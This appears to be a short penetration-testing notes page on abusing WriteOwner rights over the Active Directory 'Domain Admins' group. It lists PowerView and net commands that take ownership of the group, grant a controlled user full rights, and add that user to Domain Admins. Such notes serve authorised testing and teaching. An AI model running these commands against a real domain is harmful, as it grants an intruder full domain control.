# WriteOwner Over Domain Admins



![](../../../.gitbook/assets/2022-08-16\_15-34.png)

What this basically means is that we can pottentially add that user to the Domain Admins Groupjs because it has write permissions on the properties of the group.&#x20;

Depending whether we have credentials or a session as the user we might have to provide the variables for the password and the creds.

After importing PowerView.

```
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity <user that has privs>
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity <user that has the priv>
net group "Domain Admins" Muser that has the priv> /add /domain
```

Afterwards we should be part of the domain admins.&#x20;
